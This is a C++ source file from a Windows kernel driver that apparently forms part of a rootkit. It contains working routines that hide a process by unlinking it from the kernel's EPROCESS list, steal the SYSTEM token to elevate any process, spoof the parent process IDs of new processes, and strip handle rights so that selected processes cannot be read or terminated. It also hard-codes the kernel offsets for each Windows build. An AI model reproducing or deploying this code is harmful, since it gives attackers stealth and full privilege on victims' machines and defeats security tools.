#pragma once
#include "pch.h"

// Definitions.
#define SYSTEM_PROCESS_PID 4
#define PROCESS_TERMINATE 1
#define PROCESS_CREATE_THREAD 0x2
#define PROCESS_VM_READ 0x10
#define PROCESS_VM_OPERATION 8

#define PROCESS_TYPE_PROTECTED 0
#define PROCESS_TYPE_SPOOFED 1

#define PROCESS_NOT_FOUND -1

int FindProcess(Process* process);
bool AddProcess(Process* process);
bool RemoveProcess(Process* process);
ULONG GetActiveProcessLinksOffset();
void RemoveProcessLinks(PLIST_ENTRY current);
UINT64 GetTokenOffset();

/*
* Description:
* OnPreOpenProcess is responsible for handling process access operations and remove certain permissions from protected processes.
*
* Parameters:
* @RegistrationContext [PVOID]						   -- Unused.
* @Info				   [POB_PRE_OPERATION_INFORMATION] -- Contains important information such as process name, handle to the process, process type, etc.
*
* Returns:
* @status			   [NTSTATUS]					   -- Always OB_PREOP_SUCCESS.
*/
OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info) {
	UNREFERENCED_PARAMETER(RegistrationContext);

	Process process;

	if (Info->KernelHandle)
		return OB_PREOP_SUCCESS;

	if (pGlobals.ProtectedProcesses.PidsCount == 0)
		return OB_PREOP_SUCCESS;

	auto Process = (PEPROCESS)Info->Object;
	auto pid = HandleToULong(PsGetProcessId(Process));

	process.ProcessPid = pid;
	process.type = PROCESS_TYPE_PROTECTED;

	AutoLock locker(pGlobals.ProtectedProcesses.Lock);

	// If the process was found on the list, remove permissions for dump / write process memory and kill the process.
	if (FindProcess(&process) != PROCESS_NOT_FOUND) {
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_OPERATION;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_READ;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_CREATE_THREAD;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_DUP_HANDLE;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_TERMINATE;
	}

	return OB_PREOP_SUCCESS;
}

/*
* Description:
* OnProcessNotify is responsible for handling process creation / deletion operations and perform operations on them.
*
* Parameters:
* @LoadedProcess [PEPROCESS]			  -- Unused.
* @ProcessId	 [HANDLE]				  -- Created process pid.
* @CreateInfo    [PPS_CREATE_NOTIFY_INFO] -- Contains information about created process.
*
* Returns:
* There is no return value.
*/
void OnProcessNotify(PEPROCESS LoadedProcess, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo) {
	UNREFERENCED_PARAMETER(LoadedProcess);

	int index;
	Process process;

	if (pGlobals.SpoofedProcesses.PidsCount == 0)
		return;

	AutoLock locker(pGlobals.SpoofedProcesses.Lock);

	if (CreateInfo) {
		process.ProcessPid = (ULONG)ProcessId;
		process.SpoofedPid = (ULONG)CreateInfo->ParentProcessId;
		process.type = PROCESS_TYPE_SPOOFED;

		KdPrint((DRIVER_PREFIX "PID is %d ParentProcessId is %d.\n", process.ProcessPid, process.SpoofedPid));

		index = FindProcess(&process);

		if (index != PROCESS_NOT_FOUND) {
			CreateInfo->ParentProcessId = (HANDLE)pGlobals.SpoofedProcesses.Processes[index]->SpoofedPid;
			KdPrint((DRIVER_PREFIX "PPID should be spoofed now.\n"));
		}
	}
}

/*
* Description:
* HideProcess is responsible for hiding a process by modifying the process list.
*
* Parameters:
* @pid	  [ULONG]	 -- PID to hide.
*
* Returns:
* @status [NTSTATUS] -- Whether successfully hidden or not.
*/
NTSTATUS HideProcess(ULONG pid) {
	// Getting the offset depending on the OS version.
	ULONG pidOffset = GetActiveProcessLinksOffset();

	if (pidOffset == STATUS_UNSUCCESSFUL) {
		return STATUS_UNSUCCESSFUL;
	}
	ULONG listOffset = pidOffset + sizeof(INT_PTR);

	// Enumerating the EPROCESSes and finding the target pid.
	PEPROCESS currentEProcess = PsGetCurrentProcess();
	PLIST_ENTRY currentList = (PLIST_ENTRY)((ULONG_PTR)currentEProcess + listOffset);
	PUINT32 currentPid = (PUINT32)((ULONG_PTR)currentEProcess + pidOffset);

	if (*(UINT32*)currentPid == pid) {
		RemoveProcessLinks(currentList);
		return STATUS_SUCCESS;
	}

	PEPROCESS StartProcess = currentEProcess;

	currentEProcess = (PEPROCESS)((ULONG_PTR)currentList->Flink - listOffset);
	currentPid = (PUINT32)((ULONG_PTR)currentEProcess + pidOffset);
	currentList = (PLIST_ENTRY)((ULONG_PTR)currentEProcess + listOffset);

	while ((ULONG_PTR)StartProcess != (ULONG_PTR)currentEProcess)
	{
		if (*(UINT32*)currentPid == pid) {
			RemoveProcessLinks(currentList);
			return STATUS_SUCCESS;
		}

		currentEProcess = (PEPROCESS)((ULONG_PTR)currentList->Flink - listOffset);
		currentPid = (PUINT32)((ULONG_PTR)currentEProcess + pidOffset);
		currentList = (PLIST_ENTRY)((ULONG_PTR)currentEProcess + listOffset);
	}

	return STATUS_SUCCESS;
}

/*
* Description:
* ElevateProcess is responsible for stealing a token from the SYSTEM process and giving it to other process.
*
* Parameters:
* @pid	  [ULONG]	 -- PID to elevate.
*
* Returns:
* @status [NTSTATUS] -- Whether successfully elevated or not.
*/
NTSTATUS ElevateProcess(ULONG targetPid) {
	PEPROCESS privilegedProcess, targetProcess;
	NTSTATUS status = STATUS_SUCCESS;

	// Getting the EProcess of the target and the privileged processes.
	status = PsLookupProcessByProcessId(ULongToHandle(targetPid), &targetProcess);
	UINT64 tokenOffset = GetTokenOffset();

	if (!NT_SUCCESS(status))
	{
		return status;
	}
	status = PsLookupProcessByProcessId(ULongToHandle(SYSTEM_PROCESS_PID), &privilegedProcess);

	if (!NT_SUCCESS(status))
	{
		ObDereferenceObject(targetProcess);
		return status;
	}

	* (UINT64*)((UINT64)targetProcess + tokenOffset) = *(UINT64*)(UINT64(privilegedProcess) + tokenOffset);

	ObDereferenceObject(privilegedProcess);
	ObDereferenceObject(targetProcess);
	return status;
}

/*
* Description:
* FindProcess is responsible for searching if a process exists in the list of protected processes.
*
* Parameters:
* @pid	  [ULONG] -- PID to search.
*
* Returns:
* @status [bool]  -- Whether found or not.
*/
int FindProcess(Process* process) {
	if (process->type == PROCESS_TYPE_PROTECTED) {
		for (int i = 0; i < pGlobals.ProtectedProcesses.PidsCount; i++)
			if (pGlobals.ProtectedProcesses.Processes[i] == process->ProcessPid)
				return i;
	}
	else if (process->type == PROCESS_TYPE_SPOOFED) {
		for (int i = 0; i < pGlobals.SpoofedProcesses.PidsCount; i++)
			if (pGlobals.SpoofedProcesses.Processes[i]->ProcessPid == process->SpoofedPid)
				return i;
	}
	return PROCESS_NOT_FOUND;
}

/*
* Description:
* AddProcess is responsible for adding a process to the list of protected processes.
*
* Parameters:
* @pid	  [ULONG] -- PID to add.
*
* Returns:
* @status [bool]  -- Whether successfully added or not.
*/
bool AddProcess(Process* process) {
	if (process->type == PROCESS_TYPE_PROTECTED) {
		for (int i = 0; i < MAX_PIDS; i++)
			if (pGlobals.ProtectedProcesses.Processes[i] == 0) {
				pGlobals.ProtectedProcesses.Processes[i] = process->ProcessPid;
				pGlobals.ProtectedProcesses.PidsCount++;
				return true;
			}
	}
	// NEED TO PROPERLY ALLOCATE DATA TO AVOID BSOD.
	else if (process->type == PROCESS_TYPE_SPOOFED) {
		for (int i = 0; i < MAX_PIDS; i++)
			if (pGlobals.SpoofedProcesses.Processes[i] == nullptr || pGlobals.SpoofedProcesses.Processes[i]->ProcessPid == 0) {
				pGlobals.SpoofedProcesses.Processes[i] = (Process*)ExAllocatePoolWithTag(PagedPool, sizeof(Process), DRIVER_TAG);

				// Not enough resources.
				if (!pGlobals.SpoofedProcesses.Processes[i]) {
					break;
				}
				
				pGlobals.SpoofedProcesses.Processes[i]->ProcessPid = process->ProcessPid;
				pGlobals.SpoofedProcesses.Processes[i]->SpoofedPid = process->SpoofedPid;
				pGlobals.SpoofedProcesses.PidsCount++;
				return true;
			}
	}
	return false;
}

/*
* Description:
* RemoveProcess is responsible for remove a process from the list of protected processes.
*
* Parameters:
* @pid	  [ULONG] -- PID to remove.
*
* Returns:
* @status [bool]  -- Whether successfully removed or not.
*/
bool RemoveProcess(Process* process) {
	if (process->type == PROCESS_TYPE_PROTECTED) {
		for (int i = 0; i < MAX_PIDS; i++)
			if (pGlobals.ProtectedProcesses.Processes[i] == process->ProcessPid) {
				pGlobals.ProtectedProcesses.Processes[i] = 0;
				pGlobals.ProtectedProcesses.PidsCount--;
				return true;
			}
	}
	else if (process->type == PROCESS_TYPE_SPOOFED) {
		for (int i = 0; i < MAX_PIDS; i++)
			if (pGlobals.SpoofedProcesses.Processes[i]->ProcessPid == process->ProcessPid) {
				ExFreePoolWithTag(pGlobals.SpoofedProcesses.Processes[i], DRIVER_TAG);
				pGlobals.SpoofedProcesses.Processes[i] = nullptr;
				pGlobals.SpoofedProcesses.PidsCount--;
				return true;
			}
	}
	return false;
}

/*
* Description:
* GetActiveProcessLinksOffset is responsible for getting the active process link offset depends on the windows version.
*
* Parameters:
* There are no parameters.
*
* Returns:
* @activeProcessLinks [ULONG] -- Offset of active process links.
*/
ULONG GetActiveProcessLinksOffset() {
	ULONG activeProcessLinks = (ULONG)STATUS_UNSUCCESSFUL;
	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
	NTSTATUS result = RtlGetVersion(&osVersion);

	if (NT_SUCCESS(result)) {
		switch (osVersion.dwBuildNumber) {
		case WIN_1507:
		case WIN_1511:
		case WIN_1607:
		case WIN_1903:
		case WIN_1909:
			activeProcessLinks = 0x2f0;
			break;
		case WIN_1703:
		case WIN_1709:
		case WIN_1803:
		case WIN_1809:
			activeProcessLinks = 0x2e8;
			break;
		default:
			activeProcessLinks = 0x448;
			break;
		}
	}

	return activeProcessLinks;
}

/*
* Description:
* RemoveProcessLinks is responsible for modifying the list by connecting the previous entry to the next entry and by
* that "removing" the current entry.
*
* Parameters:
* @current [PLIST_ENTRY] -- Current process entry.
*
* Returns:
* There is no return value.
*/
void RemoveProcessLinks(PLIST_ENTRY current) {
	PLIST_ENTRY previous, next;

	/*
	* Changing the list from:
	* Prev <--> Current <--> Next
	*
	* To:
	*
	*   | ------------------------------
	*   v							   |
	* Prev        Current            Next
	*   |							   ^
	*   -------------------------------|
	*/

	previous = (current->Blink);
	next = (current->Flink);

	previous->Flink = next;
	next->Blink = previous;

	// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
	current->Blink = (PLIST_ENTRY)&current->Flink;
	current->Flink = (PLIST_ENTRY)&current->Flink;
}

/*
* Description:
* GetTokenOffset is responsible for getting the main thread's token offset depends on the windows version.
*
* Parameters:
* There are no parameters.
*
* Returns:
* @tokenOffset [UINT64] -- Offset of the main thread's token.
*/
UINT64 GetTokenOffset() {
	UINT64 tokenOffset = (UINT64)STATUS_UNSUCCESSFUL;
	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
	NTSTATUS result = RtlGetVersion(&osVersion);

	if (NT_SUCCESS(result)) {
		switch (osVersion.dwBuildNumber) {
		case WIN_1903:
		case WIN_1909:
			tokenOffset = 0x360;
			break;
		case WIN_1507:
		case WIN_1511:
		case WIN_1607:
		case WIN_1703:
		case WIN_1709:
		case WIN_1803:
		case WIN_1809:
			tokenOffset = 0x358;
			break;
		default:
			tokenOffset = 0x4b8;
			break;
		}
	}

	return tokenOffset;
}
